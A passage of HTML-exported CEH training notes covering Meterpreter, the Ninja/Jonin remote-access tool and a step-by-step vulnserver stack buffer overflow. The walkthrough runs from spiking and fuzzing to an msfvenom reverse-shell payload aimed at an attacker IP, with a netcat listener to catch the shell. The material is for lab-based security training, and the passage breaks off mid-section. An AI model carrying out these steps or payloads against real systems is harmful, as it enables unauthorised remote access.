id="1b7b1165-a266-400b-98e9-87c95b34e58b" class="bulleted-list"><li style="list-style-type:circle">Right Click → Meterpreter → Explore → Browse Files</li></ul></li></ul><ul id="44bf8935-5113-4c57-a3a1-a4409854a599" class="bulleted-list"><li style="list-style-type:disc">Screenshot<ul id="0a17393b-6fe4-4aaf-bdec-022732b803b9" class="bulleted-list"><li style="list-style-type:circle">Right Click → Meterpreter → Explore → Screenshot</li></ul></li></ul><ul id="2b470efe-5bfc-48b5-bae6-6a5e7c512d32" class="bulleted-list"><li style="list-style-type:disc"></li></ul></details></li></ul></details></li></ul><ul id="3fe5d469-4f4b-43ac-9685-a118b35b6d0c" class="toggle"><li><details open=""><summary>Use Ninja Jonin to gain access to remote system</summary><ul id="39e868bd-6773-4e8d-8a6e-c8ebdcebbd27" class="bulleted-list"><li style="list-style-type:disc">Get it from <code><strong>E:\CEH-Tools\CEHv12 Module 06 System Hacking\Spyware\General Spyware\Ninja Jonin</strong></code><code> and copy </code><code><strong>Jonin-v1.1.0-win.zip</strong></code><code> and </code><code><strong>Ninja-v1.2.1-win.zip</strong></code></li></ul><ul id="7dd28eb1-b79c-409f-9748-27fb1b50e15c" class="bulleted-list"><li style="list-style-type:disc">Ninja is the Client and Jonin is the server</li></ul><ul id="7354cd41-8154-42fb-9823-b25ca131533c" class="bulleted-list"><li style="list-style-type:disc">Its only for testing purposes because ninja opens a cmd and shows connections</li></ul><p id="a95b7b91-d144-464b-a787-7d69b977a2f5" class="">
</p><ul id="30b11708-26e2-4398-b6ea-a603c80d7d8d" class="bulleted-list"><li style="list-style-type:disc">Edit config of ninja to have the ip of the attacker</li></ul><ul id="9d324faa-2add-4a1d-ac42-855d608cdc62" class="bulleted-list"><li style="list-style-type:disc">Run Jonin on attacker and Ninja on victim</li></ul><ul id="597a5416-d7f1-4bc4-90e8-64e141208c12" class="bulleted-list"><li style="list-style-type:disc">Attacker Side<ul id="ed7f5671-5e60-4946-aaae-cc40e4ff1666" class="bulleted-list"><li style="list-style-type:circle">Type <code>list</code> to show connections</li></ul><ul id="7194c037-80a2-4ea9-b674-2e105ef5da04" class="bulleted-list"><li style="list-style-type:circle">Type <code>connect 1</code> to connect to the first victim</li></ul><ul id="f403fca3-ceb0-4aa0-a6cf-53c85d32858d" class="bulleted-list"><li style="list-style-type:circle">Change to cmd:<ul id="b3ebfda4-34a2-4809-ac56-04791d3ba8ba" class="bulleted-list"><li style="list-style-type:square">Type <code>change</code> and then <code>cmd</code></li></ul></li></ul><ul id="cd72b44e-a92b-450d-9804-07e0e2791fc3" class="bulleted-list"><li style="list-style-type:circle">Show help<ul id="2e8c936c-9fe5-4ba7-b377-609a4728cbe2" class="bulleted-list"><li style="list-style-type:square">Type <code>#help</code></li></ul></li></ul></li></ul></details></li></ul><ul id="1bc83fe2-b9b5-421b-818e-07bc688e6b99" class="toggle"><li><details open=""><summary>Buffer Overflow to gain access to remote system</summary><ul id="1f050c5e-6444-4838-8c4f-bb1233f0a6d0" class="toggle"><li><details open=""><summary>Exploitation Steps</summary><ol type="1" id="21546d76-7ade-4830-b7a2-38cff8b1825b" class="numbered-list" start="1"><li>Perform spiking to find out if target is exploitable</li></ol><ol type="1" id="31dc247f-8dbe-4a3a-9d8b-db3ba9a37b41" class="numbered-list" start="2"><li>Perform fuzzing to identify the range in which we can overwrite EIP</li></ol><ol type="1" id="a328ff70-9b1a-4b0b-b874-b05f8f3f816a" class="numbered-list" start="3"><li>Test successful overwrite of EIP</li></ol><ol type="1" id="5c1dfff1-4cb6-411d-8e4d-7391887a0a95" class="numbered-list" start="4"><li>Test for bad characters to not use</li></ol><ol type="1" id="7e5c66d2-3b43-45e7-8390-43a94ec85382" class="numbered-list" start="5"><li>Identify unprotected memory location to use a jump</li></ol><ol type="1" id="07281e26-3f06-4a73-a8f3-b0c780808fb5" class="numbered-list" start="6"><li>Find the jump and test it</li></ol><ol type="1" id="1a640d45-32f8-441e-9ed8-34449f97c09c" class="numbered-list" start="7"><li>Create and execute shellcode</li></ol></details></li></ul><p id="7c6b9bed-40c3-4ea7-aade-fcf2a78aab02" class="">This vulnerability allows the application to exceed the buffer while writing data to the buffer and overwrite neighboring memory locations. </p><p id="98cc2a68-64f1-471c-8c15-3a314c941a8c" class="">Further, this vulnerability leads to erratic system behavior, system crash, memory access errors, etc. </p><p id="ea69e1a8-72d9-44bc-90df-f1d56718e3f1" class="">
</p><ul id="efc0b017-84e3-4dc8-a91b-a5a641a42900" class="toggle"><li><details open=""><summary>Setup</summary><ul id="33e3111c-1602-406e-9287-f3cc3eb3651f" class="bulleted-list"><li style="list-style-type:disc">Run the vulnerable server<ul id="6ea84fbd-98f3-492c-8a76-4e2cd1b1e1c1" class="bulleted-list"><li style="list-style-type:circle">Use <code><strong>E:\CEH-Tools\CEHv12 Module 06 System Hacking\Buffer Overflow Tools\vulnserver</strong></code></li></ul></li></ul><ul id="a27fce0b-0bd2-4c3f-9cc3-fe6da744562e" class="bulleted-list"><li style="list-style-type:disc">Run <code>Immunity Debugger</code> <ul id="80caaa27-8727-40be-a905-4bff37712b3c" class="bulleted-list"><li style="list-style-type:circle">Found in <code><strong>E:\CEH-Tools\CEHv12 Module 06 System Hacking\Buffer Overflow Tools\Immunity Debugger</strong></code><code>, right-click </code><code><strong>ImmunityDebugger_1_85_setup.exe</strong></code></li></ul></li></ul><ul id="d89e4880-32c3-4fd2-a214-fa4e396449f2" class="bulleted-list"><li style="list-style-type:disc">Attach the debugger to the vulnerable server<ul id="cfede4dd-486f-435e-9c2e-637766ba81cf" class="bulleted-list"><li style="list-style-type:circle">File → Attach → vulnserver</li></ul><ul id="9f2f211f-7e72-42a2-84ad-a704eb9819da" class="bulleted-list"><li style="list-style-type:circle">It loads as paused, (see bottom right)</li></ul><ul id="595ab58a-7d82-49d8-a451-a5608fe79321" class="bulleted-list"><li style="list-style-type:circle">You can run it by clicking the top left red play button</li></ul></li></ul><ul id="7c0fb9e2-09bd-4a87-b576-8b39b028d7f6" class="bulleted-list"><li style="list-style-type:disc">Test connection to the vulnerable server<ul id="bae2c628-0e25-4943-92e9-c2fb80ba32bb" class="bulleted-list"><li style="list-style-type:circle">We used Parrot OS and netcat</li></ul><ul id="558ca5d8-ea6d-479c-b3ac-5a236fd79566" class="bulleted-list"><li style="list-style-type:circle">Run <code>nc -nv &lt;target&gt; 9999</code></li></ul></li></ul></details></li></ul><ul id="bbc01c37-1452-4310-bf28-5abf50945649" class="toggle"><li><details open=""><summary>Explore the program</summary><ul id="39a43b5a-2ca6-4377-8765-fa2d2e2522c9" class="bulleted-list"><li style="list-style-type:disc">We can se that we can use HELP</li></ul><ul id="5cf3ab2f-3454-42d8-9c01-c3e4bbf5cd19" class="bulleted-list"><li style="list-style-type:disc">And it provides alot of options and commands to execute</li></ul><ul id="d86f6ce5-306a-42d1-aa72-e4dd37267f01" class="bulleted-list"><li style="list-style-type:disc">We will try to spike every command to find vulnerabilities</li></ul></details></li></ul><ul id="b1fe282e-ffdf-4163-b8b5-9c553efe453c" class="toggle"><li><details open=""><summary>Perform Spiking</summary><ul id="7f50c8ec-bf74-44db-806d-30128816622f" class="toggle"><li><details open=""><summary>What is spiking</summary><p id="171f0ca3-4987-4dbc-8025-9b6dfa907ec3" class="">It is a technique used in the discovery phase to observe the behaviour of an application</p><p id="378a3fac-d1f3-496e-b37e-3a798709569f" class="">The goal is to cause the application to behave in unexpected ways such as crashing, freezing or producing errors, which indicates the presence of a vulnerability</p><p id="0bc56caf-e3d7-47ef-a81b-7f9713fd06ee" class="">It is a form of fuzz testing, where the application is bombarded with random or semi-random data to discover weaknesses.</p><p id="908b09b0-ee21-4124-a3ce-df01d12f69db" class="">
</p><ul id="3650feae-1b87-411a-b1c1-01a0adb379e7" class="toggle"><li><details open=""><summary>Templates</summary><ul id="af9fcfef-95d1-47d3-95c7-dfb561ee8099" class="bulleted-list"><li style="list-style-type:disc"><strong>Templates</strong>: In the context of spiking, templates are predefined sets of data or scripts that define how the spiking data should be structured and sent to the target application.</li></ul><ul id="4515860b-8df6-4d2f-a28d-68b0694ffc59" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: Templates automate the process of generating the test inputs, making it easier and more efficient to perform comprehensive testing.</li></ul></details></li></ul><ul id="654eefae-fd10-46c3-a66b-b74b6092ea5e" class="toggle"><li><details open=""><summary>Spiking Procedure</summary><ul id="dc3d2c92-94ba-4a55-a3c7-9a9bed3e7a83" class="bulleted-list"><li style="list-style-type:disc"><strong>Identify Target</strong>: Determine the target application and the specific input vectors (e.g., network ports, API endpoints) that will be tested.</li></ul><ul id="6bf2cf15-ae0f-491f-a405-f4f09fc35997" class="bulleted-list"><li style="list-style-type:disc"><strong>Create Templates</strong>: Develop spike templates that define the structure of the test inputs. These templates specify how the data should be manipulated and sent to the target.</li></ul><ul id="d55d92a0-923c-428b-9bef-b70c45a1a627" class="bulleted-list"><li style="list-style-type:disc"><strong>Send Inputs</strong>: Use a spiking tool to send the crafted inputs defined by the templates to the target application.</li></ul><ul id="0b142a16-4e26-4759-b24f-1b6753ff88da" class="bulleted-list"><li style="list-style-type:disc"><strong>Monitor Behavior</strong>: Observe the application&#x27;s behavior in response to the inputs. Look for signs of crashes, hangs, or other abnormal behavior. Usually through a debugger or through responses</li></ul><ul id="b5f0efc1-44bc-4aa1-9c7d-3fb27f0298ad" class="bulleted-list"><li style="list-style-type:disc"><strong>Analyze Results</strong>: Analyze the results to identify potential vulnerabilities. If the application crashes or behaves unexpectedly, it may indicate a vulnerability that can be further investigated.</li></ul></details></li></ul></details></li></ul><ul id="06bf3203-0891-4bd8-9a42-44dbaabd2ada" class="bulleted-list"><li style="list-style-type:disc">We will attempt to spike every command and see where the program breaks, through the debugger</li></ul><p id="53e46f5f-6ab6-4002-b312-82dc5d0939e8" class="">
</p><ul id="53d23d8b-985c-4585-b0c3-e651722b00fe" class="bulleted-list"><li style="list-style-type:disc">Create a <code>.spk</code> file and add the following:<ul id="e13e42b5-2777-4f00-a84e-e25f7e21f233" class="bulleted-list"><li style="list-style-type:circle">s_readline();<ul id="608a83c4-ebd5-4807-a9f8-23ad43b62023" class="bulleted-list"><li style="list-style-type:square">expects to receive some initial data when connected so we read these</li></ul></li></ul><ul id="b48af6d5-2393-47eb-a01f-67485c12be6b" class="bulleted-list"><li style="list-style-type:circle">s_string(”STATS ”)<ul id="debb83d2-715b-4f3b-bdf6-7d28827a9d79" class="bulleted-list"><li style="list-style-type:square">send a STATS command because this doesn’t change, its a static part of the payload</li></ul><ul id="b9774dc9-40c0-4754-8880-865800c8b40f" class="bulleted-list"><li style="list-style-type:square">The stats command accepts a value and this value is what we are going to fuzz</li></ul><ul id="5912b773-92b9-4331-8c4a-c49204dcf6f4" class="bulleted-list"><li style="list-style-type:square">Notice the space after stats, because its a command that accepts a variable, it needs space after it so that the var is not appended</li></ul></li></ul><ul id="0e7c4c74-5d4c-4818-b6eb-819492f3c14f" class="bulleted-list"><li style="list-style-type:circle">s_string_variable(”0”);<ul id="df38ecc1-5b3a-4108-9105-03c4e247fc52" class="bulleted-list"><li style="list-style-type:square">Then send a fuzzing variable 0 that will be fuzzed to test for various input after we have entered the STATS command</li></ul></li></ul><ul id="3a1eeb72-93dd-41df-a672-6296bdf468cb" class="bulleted-list"><li style="list-style-type:circle">This will attempt to spike the STATS option of the program</li></ul></li></ul><ul id="4172bfc2-a4a7-44ea-b7e1-f0965a9dc267" class="bulleted-list"><li style="list-style-type:disc">Send the spikes to the server<ul id="4a71f111-f511-4ec1-8bec-5683054788d4" class="bulleted-list"><li style="list-style-type:circle"><code>generic_send_tcp &lt;target&gt; 9999 &lt;file&gt; 0 0</code></li></ul><ul id="d58c662e-b6fa-47e5-8892-d0b27cc1fe32" class="bulleted-list"><li style="list-style-type:circle">Values 0 and 0 are <code>SKIPVAR</code> and <code>SKIPSTR</code></li></ul></li></ul><ul id="2ee2a08f-260d-4eaf-a663-41dc7afd05bf" class="bulleted-list"><li style="list-style-type:disc">Confirm that the application has crashed<ul id="810eb41b-ecd9-4f18-bfb3-f17213b6db5c" class="bulleted-list"><li style="list-style-type:circle">So we go back to the debugger with every try and check if its still running or crashed</li></ul><ul id="43e102fb-e86f-4048-870b-f74b3390bec0" class="bulleted-list"><li style="list-style-type:circle">We can see it in the lower right corner</li></ul><ul id="efd1726e-63dc-4ccb-9d05-f97cf9467c10" class="bulleted-list"><li style="list-style-type:circle">It successfully crashed on the TRUN option and we can observe it from the debugger that its now Paused</li></ul><ul id="3a16309a-b53a-4b07-802a-43030c0c8a7b" class="bulleted-list"><li style="list-style-type:circle">Our objective is to overwrite the EIP register which will allow us to gain shell access to the target system</li></ul><ul id="08a4d328-5b35-40ae-b51f-92c820c5c54e" class="bulleted-list"><li style="list-style-type:circle">Here, the EIP was overwritten to 41414141 which we know is the character AAAA</li></ul></li></ul></details></li></ul><ul id="9cc3ba42-04ca-4253-9843-e962371670fe" class="toggle"><li><details open=""><summary>Perform Fuzzing</summary><ul id="692fbaca-5d4d-4c2d-950e-7069eda1b7cf" class="bulleted-list"><li style="list-style-type:disc">We do this to find the mazimum buffer it accepts before it crashes so that we play in that range</li></ul><ul id="d564cf9e-b2b1-4a8d-988a-58646e4a79f5" class="bulleted-list"><li style="list-style-type:disc">Close and relaunch the Immunity Debugger and the vulnserver<ul id="364ec634-5e12-4f8c-a456-996587a49f4f" class="bulleted-list"><li style="list-style-type:circle">Attach and press play</li></ul></li></ul><ul id="c72394d9-b437-49e2-8fc7-919379d4a243" class="bulleted-list"><li style="list-style-type:disc"><code>CEH Tools → CEHv12 Module 06 System Hacking\Buffer Overflow Tools\fuzz.py</code></li></ul><ul id="78629f30-14f1-4efc-ab06-37a17cca9c9a" class="bulleted-list"><li style="list-style-type:disc">Run <code>fuzz.py</code><ul id="d9c07a20-860f-465b-9920-07be7e952f31" class="bulleted-list"><li style="list-style-type:circle">It already has the config for fuzzing</li></ul><ul id="125bc10c-79bb-4652-b95a-f96bec754717" class="bulleted-list"><li style="list-style-type:circle">Wait for Debugger to Pause and then Ctrl+C the fuzzer</li></ul></li></ul><ul id="497f6470-0ddd-455b-8e9c-b44f0ae0fc8b" class="bulleted-list"><li style="list-style-type:disc">The fuzzer now shows the maximum data it used when it broke. <ul id="7ff44756-43ef-426c-a2a8-06fe022acec6" class="bulleted-list"><li style="list-style-type:circle">This is because it breaks when EIP is overwritten to another address</li></ul><ul id="79c55490-c6c5-4dbd-8437-709df4f5a50b" class="bulleted-list"><li style="list-style-type:circle">And the fuzzing sends random lengths</li></ul></li></ul><ul id="f48e5255-64a1-4767-8710-85811160878d" class="bulleted-list"><li style="list-style-type:disc">In this case its 2300 bytes but it can vary from execution</li></ul><p id="8b78a45d-60ab-498c-b3d9-1200828d95ff" class="">
</p><p id="7d5b8cad-74d4-428a-9be3-6358cfd1fcbe" class="">
</p></details></li></ul><ul id="e7dd1d66-993d-415e-9cde-c9df6a276084" class="toggle"><li><details open=""><summary>Find the offset using a pattern</summary><p id="54eabba2-4bfc-49e0-b76c-bac6233fecab" class="">Here we will create a pattern that has different characters for every byte</p><ul id="2d66d001-272d-4bb2-9398-99afc6e345b6" class="bulleted-list"><li style="list-style-type:disc">Relaunch the Debugger and the vulnserver, attach and start</li></ul><ul id="96dd2382-4136-43c4-90aa-b52396364308" class="bulleted-list"><li style="list-style-type:disc">Run <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;size we found but nearest even number&gt;</code></li></ul><ul id="4bb786c5-2e09-4baf-bcd4-442b1c18cdc3" class="bulleted-list"><li style="list-style-type:disc">We have generated a pattern that has different character for every byte, copy it</li></ul><ul id="43baa602-07f6-4221-a0da-e72528f217af" class="bulleted-list"><li style="list-style-type:disc">Edit <code>CEH Tools → CEHv12 Module 06 System Hacking\Buffer Overflow Tools\findoff.py</code></li></ul><ul id="a9be8abb-91ed-4527-b500-96b571a5a373" class="bulleted-list"><li style="list-style-type:disc">Replace the offset of the file to the pattern you have copied</li></ul><ul id="8841414b-9ffc-4cee-a062-2419d8656991" class="bulleted-list"><li style="list-style-type:disc">Run <code>findoff.py</code></li></ul><ul id="8324945c-96b5-4342-bb64-c8e72206c37d" class="bulleted-list"><li style="list-style-type:disc">It will crash the program and overwrite EIP, write down the EIP value (eg. 386F4337), now we will see where </li></ul><ul id="cc0fb127-2272-4e0e-b261-2ca2c5bd285a" class="bulleted-list"><li style="list-style-type:disc">To find the exact match, run <code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337</code></li></ul><ul id="9ae9f5b6-326f-4471-b84b-a75210161390" class="bulleted-list"><li style="list-style-type:disc">It should say <code>[*] Exact match at offset 2003</code></li></ul></details></li></ul><ul id="ec39a0ce-8736-4cd1-a75c-01ea7893aa90" class="toggle"><li><details open=""><summary>Test successful overwrite of EIP</summary><ul id="fb343564-b363-43fb-9333-d40552552b4a" class="bulleted-list"><li style="list-style-type:disc">Restart debugger and vulnserver, attach and play</li></ul><ul id="0fc14d9f-dc4f-47ee-9cc3-2cbe11797ecf" class="bulleted-list"><li style="list-style-type:disc">Run <code>CEH Tools → CEHv12 Module 06 System Hacking\Buffer Overflow Tools\findoff.py</code><ul id="339a1910-7ac1-4604-a3fa-178594153db4" class="bulleted-list"><li style="list-style-type:circle">Change the offset to the one we found</li></ul><ul id="e3c100aa-50c1-4a21-a78e-d14d8e25f5e4" class="bulleted-list"><li style="list-style-type:circle">This script writes 4Ds in EIP</li></ul></li></ul><p id="bf2ad227-5601-4639-ad8e-e154497ddbf9" class="">
</p></details></li></ul><ul id="e8f1c5a7-c425-4916-9dc9-afc8105d7d04" class="toggle"><li><details open=""><summary>Identify bad characters</summary><ul id="889dbdbe-c1e5-45e5-9ccf-2896827e482e" class="bulleted-list"><li style="list-style-type:disc">Restart debugger and vulnserver</li></ul><ul id="a2c577c5-9636-4fc4-b545-33aac1b211f6" class="bulleted-list"><li style="list-style-type:disc">You can obtain the badchars through a Google search. Characters such as no byte, i.e., “\x00”, are badchars because they can interrupt the flow of execution (eg. terminate a string)</li></ul><ul id="e3475197-342a-437b-8726-6219eb8f582d" class="bulleted-list"><li style="list-style-type:disc">We identify these so that we avoid using characters that change the flow we intend to create </li></ul><ul id="d7d32851-1010-4f3b-b8dd-9da6a0e24f3c" class="bulleted-list"><li style="list-style-type:disc">Run <code>CEH Tools → CEHv12 Module 06 System Hacking\Buffer Overflow Tools\badchars.py</code></li></ul><ul id="578858e4-dfce-4fbb-a6d6-60ddc5e3fca1" class="bulleted-list"><li style="list-style-type:disc">After debugger has stopped execution, right click on ESP and click <code>Follow in dump</code><ul id="27c355fc-7c2a-4b4f-8f11-14cf90277d90" class="bulleted-list"><li style="list-style-type:circle">Because the stack pointer holds the position where the data are stored</li></ul></li></ul><ul id="f02b23cb-3706-4698-b799-61eafb5e8316" class="bulleted-list"><li style="list-style-type:disc">In the left down window, we can see the shellcode in hex dump and ascii</li></ul><ul id="172b9962-5944-4cbe-9938-e26ae3193547" class="bulleted-list"><li style="list-style-type:disc">We can identify the characters we used by looking at the hex order and compare it to our real order</li></ul><ul id="09110320-6c98-4ff1-b662-e198f225ce9d" class="bulleted-list"><li style="list-style-type:disc">If we can see bytes missing then its a bad character<ul id="844a242b-3e25-46f3-9076-cae78181a950" class="bulleted-list"><li style="list-style-type:circle">eg1. 01 02 B0 04 05<ul id="e4d167ea-d361-42ae-a1e9-518537763c94" class="bulleted-list"><li style="list-style-type:square">03 is missing and replaced with B0</li></ul><ul id="837b1917-21c2-4a58-b24f-c273c5ab19cd" class="bulleted-list"><li style="list-style-type:square">so 03 is a bad character</li></ul></li></ul><ul id="7f968e5c-3010-4ff9-95a0-d5ddeb20d63b" class="bulleted-list"><li style="list-style-type:circle">eg2. 05 06 B0 B0 09<ul id="58d94932-9979-40fb-a9ea-9a0beb3afe4c" class="bulleted-list"><li style="list-style-type:square">we miss 07 and 08</li></ul><ul id="baa606d5-d266-492f-95ca-d4bc8912c3b1" class="bulleted-list"><li style="list-style-type:square">in consecutive cases only the first one is bad</li></ul><ul id="fdc5d9e9-4284-461e-8d99-7d07fd0e91e9" class="bulleted-list"><li style="list-style-type:square">so only 07 is a bad character</li></ul></li></ul></li></ul></details></li></ul><ul id="09c2ea43-a329-4323-9528-2f63dcc66cf8" class="toggle"><li><details open=""><summary>Identify unprotected memory locations</summary><ul id="0e45f507-4842-4c63-8a0a-697749040c8d" class="bulleted-list"><li style="list-style-type:disc">We do this so that we know where to jump to and where to overwrite</li></ul><ul id="c1731898-397f-4839-bb78-6082b8fc9768" class="bulleted-list"><li style="list-style-type:disc">Copy <code><a href="http://mona.py">mona.py</a></code> and paste it in immunity debugger folder<ul id="827bed1d-d234-4f0a-b5e5-91a2bb0fa71d" class="bulleted-list"><li style="list-style-type:circle">From <code><strong>CEH-Tools\CEHv12 Module 06 System Hacking\Buffer Overflow Tools\Scripts</strong></code></li></ul><ul id="59c9d469-cf3e-4377-b952-1e63560472b9" class="bulleted-list"><li style="list-style-type:circle">To <code><strong>C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</strong></code></li></ul></li></ul><ul id="4d2f5564-ed29-46cd-9871-84bf0f0cde38" class="bulleted-list"><li style="list-style-type:disc">In Immunity Debugger, on the downmost text box type <code>!mona modules</code> and press enter<ul id="0d604476-4597-4f50-8cbb-43248f30594e" class="bulleted-list"><li style="list-style-type:circle">It opens a window that shows the output of all the modules that were run</li></ul></li></ul><ul id="a4f7ded9-0d8d-4d6e-826b-29e5f6b88b8b" class="bulleted-list"><li style="list-style-type:disc">What mona does is dump the protection settings for the dll files of the process</li></ul><ul id="310b1ce5-f537-41af-a82c-4125885eaa43" class="bulleted-list"><li style="list-style-type:disc">We identified that a dll named <code>essfunc.dll</code> does not have any protecton at all (everything is false)</li></ul></details></li></ul><ul id="cdea58c1-ac6f-456b-a673-b27f610c5fd5" class="toggle"><li><details open=""><summary>Identify a jump inside the unprotected dll</summary><ul id="7fc16041-5319-41ef-aa53-a4abc111038f" class="bulleted-list"><li style="list-style-type:disc">We want to find a jump to esp so that it  jumps on top of the current stack frame (which has its address in esp) and start running the code we will be overwriting</li></ul><ul id="75ddf885-410c-46c9-9c9d-ad038b500068" class="bulleted-list"><li style="list-style-type:disc">We will use a converter from assembly to hex to see how jmp is in hex<ul id="9ef62e87-0fb4-42e6-9e8f-da20ea0ece13" class="bulleted-list"><li style="list-style-type:circle">Run <code><strong>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</strong></code></li></ul><ul id="0fac507d-1d0f-4f02-9fa0-dfcb6bbe5b52" class="bulleted-list"><li style="list-style-type:circle">Type <code>JMP ESP</code> and copy the hex (FFE4)</li></ul><ul id="07395b06-03b6-45e6-88de-4e976133aa7f" class="bulleted-list"><li style="list-style-type:circle">Type <code>EXIT</code> to leave</li></ul></li></ul><ul id="2eb54cea-8aa5-4d5f-b0eb-fed676736daa" class="bulleted-list"><li style="list-style-type:disc">Find a jump instruction<ul id="3e1efa64-e0b8-4bb3-aed5-9a0483f34a75" class="bulleted-list"><li style="list-style-type:circle">Type <code>!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll</code><ul id="f42edcbd-939f-427f-aa63-17c771cbb918" class="bulleted-list"><li style="list-style-type:square">To find a jmp in the specified dll</li></ul><ul id="3fad49e6-3540-4a30-83a0-d2daaf15055a" class="bulleted-list"><li style="list-style-type:square">We can find multiple addresses, one of them is <code>0x625011af</code></li></ul></li></ul></li></ul></details></li></ul><ul id="0b6f68d3-1877-4ed9-826a-7775ef2df88a" class="toggle"><li><details open=""><summary>Test the jump</summary><ul id="512943fc-f92c-4be5-9a45-55d7c25e020d" class="bulleted-list"><li style="list-style-type:disc">Set a break point on that instruction<ul id="22c916c2-3775-4c28-8a87-7e3158239b45" class="bulleted-list"><li style="list-style-type:circle">Close and relaunch debugger and vulnserver</li></ul><ul id="93a87a43-6476-41aa-bcbc-e497d2f43112" class="bulleted-list"><li style="list-style-type:circle">Press the address disassembler button to find an instruction <figure id="6b784685-7692-47b6-bc2f-6b95b7091a4a" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2091.png"><img style="width:15px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2091.png"/></a></figure></li></ul><ul id="29a69479-774a-4321-a67e-fd927b59b070" class="bulleted-list"><li style="list-style-type:circle">Write down the address of the jmp we found in the previous step</li></ul><ul id="985c59f2-853d-4758-aa4f-8b48358b586f" class="bulleted-list"><li style="list-style-type:circle">Press F2 to set up a break point</li></ul><ul id="436c0166-0c44-4456-94c5-2f37e12c473b" class="bulleted-list"><li style="list-style-type:circle">Click the play button to resume execution of the vulnserver</li></ul></li></ul><ul id="fca75948-4462-4b07-ab16-86905c55bc7b" class="bulleted-list"><li style="list-style-type:disc">Confirm overwrite of EIP to jmp memory address<ul id="07cc1663-a60a-444b-9c08-36ad62ae05b1" class="bulleted-list"><li style="list-style-type:circle">Run <code>jump.py</code></li></ul><ul id="86b6e8f5-604f-483c-807a-7d50bd337557" class="bulleted-list"><li style="list-style-type:circle">It contains the shellcode with address to jump. Note it is written in hex bytes, so they are in reverse order and reversed numbers</li></ul><ul id="b135562f-8f8b-4060-abaa-bf83a630074f" class="bulleted-list"><li style="list-style-type:circle">Since we have found where EIP is rewritten, we rewrite to the address of the jump register we found</li></ul><ul id="78478170-be27-407c-a2a5-6753ee924021" class="bulleted-list"><li style="list-style-type:circle">Should end up writing the address to EIP</li></ul></li></ul><p id="cb9de5e3-a374-44c6-af27-ef0aeb7a9351" class="">
</p></details></li></ul><ul id="b4c17407-3ecd-4dff-a99f-880ad6ecbfc5" class="toggle"><li><details open=""><summary>Create and execute the shellcode</summary><ul id="225883ec-cb94-4c99-b06e-fca5b8af54a8" class="bulleted-list"><li style="list-style-type:disc">Generate shellcode using msfvenom<ul id="972390af-3726-4162-a48c-f72ef66e639b" class="bulleted-list"><li style="list-style-type:circle"><code><strong>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;attacker ip&gt; LPORT=&lt;port&gt; EXITFUNC=thread -f c -a x86 -b “\x00”</strong></code></li></ul><ul id="3d5efd35-1010-4fb1-9d5c-0513024a6aaa" class="bulleted-list"><li style="list-style-type:circle">It excludes null bytes because they are bad characters</li></ul></li></ul><ul id="991a9be0-e314-4625-9324-cdb6d62ba4c6" class="bulleted-list"><li style="list-style-type:disc">Copy the shellcode</li></ul><ul id="003546a9-2beb-43c9-ae6a-4c139901b944" class="bulleted-list"><li style="list-style-type:disc">Paste it in the overflow variable of <code>shellcode.py</code> inside the parenthesis</li></ul><ul id="fc57abd2-d942-491d-a0e9-e17c846956a1" class="bulleted-list"><li style="list-style-type:disc">Run <code>nc -nvlp 4444</code> on attacker machine</li></ul><ul id="3885908c-f1df-4c69-bf05-5856ec2ea72c" class="bulleted-list"><li style="list-style-type:disc">Run the <code>vulnserver</code> as an administrator on the victim machine (without debugger)</li></ul><ul id="b843ff08-7761-4f0a-b2e0-539120bfc102" class="bulleted-list"><li style="list-style-type:disc">Run <code>shellcode.py</code></li></ul><ul id="d3d73614-51e3-4d8b-b590-c7a524e7ebf0" class="bulleted-list"><li style="list-style-type:disc">Should return a shell on netcat</li></ul></details></li></ul><p id="7497bd1f-8410-4ba5-9a32-bc1cebdc2f68" class="">
</p><ul id="84329097-171c-48bd-b00b-5e89de00b572" class="toggle"><li><details open=""><summary>Understanding how shellocode affects the stack and gets the payload executed</summary><ul id="11d944bf-4a0d-47f1-acdc-cf334ff8a807" class="toggle"><li><details open=""><summary>How the stack works</summary><figure id="92419cb0-3af9-4ce0-adef-918afa1e1e44" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2092.png"><img style="width:480px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2092.png"/></a></figure><ul id="642cf370-52fd-4f0b-bb61-7e6e2ab24c91" class="bulleted-list"><li style="list-style-type:disc">The Stack has frames, child functions create frames on top of parent function frames</li></ul><ul id="1c430e93-8a3d-4063-8d86-97c49f62471d" class="bulleted-list"><li style="list-style-type:disc">ESP (Stack Pointer) always points at the start of the stack</li></ul><ul id="198f22f3-3e1e-4cfa-97c7-e1c81fc68571" class="bulleted-list"><li style="list-style-type:disc">EBP (Base Pointer) always points at the end of Stored EBP</li></ul><ul id="2129be4b-c6c7-4d3a-b876-8e6739397676" class="bulleted-list"><li style="list-style-type:disc">Stored EBP has the EBP address of the parent function frame (-1) so that it can be restored when this child function is done</li></ul><ul id="3f5ddfcb-877b-44ca-af16-fb47ff48308c" class="bulleted-list"><li style="list-style-type:disc">Function variables when overflowed, can overwrite all the contents below it, including Stored EBP, Return Address and parent function frames.<ul id="844dc317-64d1-4852-ba2b-2f242615c33e" class="bulleted-list"><li style="list-style-type:circle">In this case, we are interested in overwriting the return address</li></ul></li></ul><ul id="8e80d4e8-0676-4138-9a20-3ea3d1627ccf" class="bulleted-list"><li style="list-style-type:disc">Before returning to Return Address, EBP and ESP are restored to the parent frame</li></ul></details></li></ul><ul id="9c79b071-af73-4f53-a693-bdc71d8ede7b" class="toggle"><li><details open=""><summary>How shellcode works in this example:</summary><ul id="46ea9fac-b0d3-4ff0-9abf-f42ab615b7b6" class="bulleted-list"><li style="list-style-type:disc">The Function Variable is overflowed and rewrites all the proceeding contents of the stack in this order:<ol type="1" id="7423042d-a838-477c-b202-e11637b29acd" class="numbered-list" start="1"><li>AAAA….</li></ol><ol type="1" 